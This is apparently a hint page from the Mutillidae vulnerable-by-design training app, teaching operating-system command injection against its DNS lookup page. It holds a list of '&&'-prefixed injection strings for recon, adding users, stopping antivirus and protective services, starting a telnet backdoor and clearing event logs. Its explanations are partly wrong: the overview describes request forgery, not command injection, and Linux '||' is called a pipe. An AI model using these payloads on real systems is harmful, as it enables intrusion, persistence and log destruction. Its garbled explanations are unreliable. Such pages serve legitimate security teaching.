<br/><br/>
<span class="report-header">Overview</span>
<br/><br/>
Command Injection may occcur when an attacker is able to run script
into a users browser. To forge a legitimate request, the script creates and
send the same parameters to the target website that would be sent if the user
had submitted the legitimate form themselves. The target website knows the 
request has come from the users browser but cannot detect that the request was
created and sent by a malicious script running in the users browser. As far as
the target site can tell, the user submitted the request by using the web site
in the expected way.
<br/><br/>
<span class="report-header">Discovery Methodology</span>
<br/><br/>
Fuzz with command separators like ;, &amp; and &amp;&amp; depending on if
you are using Linux or Windows respectively. Look for errors
that are related to operating system errors, delays in responses
which can be repeated by repeating the injection, or unexpected
output in the response. The error may appear as an HTML comment.
<br/><br/>
Attempt to determine the operating system type.
<br/><br/>
<span class="label">Reserved characters used in fuzzing for command injection</span>
<br/><br/>
<span class="label">&amp;</span>: Used to separate multiple commands on one command line. 
Runs the first command then the second command.
<br/><br/>
<span class="label">&amp;&amp;</span>: Used to run the command following &amp;&amp; only if the 
preceding command is successful. 
<br/><br/>
<span class="label">|| (Windows)</span>: Used to run the command following || only if the preceding command fails. 
Runs the first command then runs the second command only if the 
first command did not complete successfully.
<br/><br/>
<span class="label">|| (Linux)</span>: Redirects standard output of the first command to standard input
of the second command.
<br/><br/>
<span class="label">( )</span>: Use to nest commands.
<br/><br/>
<span class="label">#</span>: Command line comment symbol
<br/><br/>
<span class="report-header">Exploitation</span>
<br/><br/>
Inject operating system commands methodically. "ls" and "dir" are reasonably
good commands to attempt since most user accounts will have permission to
execute directory listings by default and these two commands tend to 
be exclusive (Windows will not typically execute "ls" and Linux will typically
not execute "dir" but this behavior absolutely varies)
<br/><br/>
Prefix the injections with each of the reserved characters then for each prefix
suffix each injection as well.
<br/><br/>
<span class="report-header">Examples</span>
<br/><br/>
Examples for page "dns-lookup.php"
<br/><br/>
<span style="white-space: pre;">
Recon: Discover available functionality using provided help

	Windows XP: &amp;&amp; help
	Linux: &amp;&amp; &lt;cmd&gt; --help
	Linux: &amp;&amp; man &lt;cmd&gt;

Recon: Determine current directory

	Windows XP: &amp;&amp; dir
	Linux: &amp;&amp; pwd

Recon: Chain commands to discover driectory structure

	Windows XP: &amp;&amp; cd ../../.. &amp;&amp; dir
	Linux: &amp;&amp; cd ../../.. &amp;&amp; ls -l

Scanning: Get machine network settings, hostname, DNS servers, subnet mask, etc.

	Windows XP: &amp;&amp; ipconfig /all
	Linux: &amp;&amp; ifconfig

Scanning: Discover hosts on network

	Windows XP: &amp;&amp; ping -n 1 192.168.56.102
	Linux: &amp;&amp; ping -c 1 192.168.56.102

Scanning: Enumerate Current user

	Windows XP: &amp;&amp; set
	Linux: &amp;&amp; whoami

Scanning: Enumerate computers, users, groups, AD computers, AD users, AD groups

	Windows XP: &amp;&amp; net view [/domain]
	Windows XP: &amp;&amp; net user [/domain]
	Windows XP: &amp;&amp; net localgroup [/domain]

Gaining Access: Add user

	Windows XP: &amp;&amp; net user &lt;username&gt; /add
	Linux: useradd &lt;username&gt; 

Gaining Access: Delete user

	Windows XP: &amp;&amp; net user &lt;username&gt; /delete 

Maintain Access: kill AV

	net stop &lt;av process&gt;

Maintain Access: Kill AV/protective services or open backdoor services
	Windows XP: &amp;&amp; net stop &lt;service name&gt;
	Windows XP: &amp;&amp; net start telnet
	Windows XP: &amp;&amp; net stop telnet
	
Cover Tracks: Clear logs

	Windows XP: &amp;&amp; wevtutil cl
		</span>			
<br/><br/>
<span class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CommandInjectiontoDumpFilesStartServicesandDisableFirewall);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoLocatetheEastereggFileusingCommandInjection);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->GainingAdministrativeShellAccessviaCommandInjection);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->UsingCommandInjectiontoGainRemoteDesktop);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->SolvingPasswordChallengeInMutillidaeWithCommandInjection);?>
<br/><br/>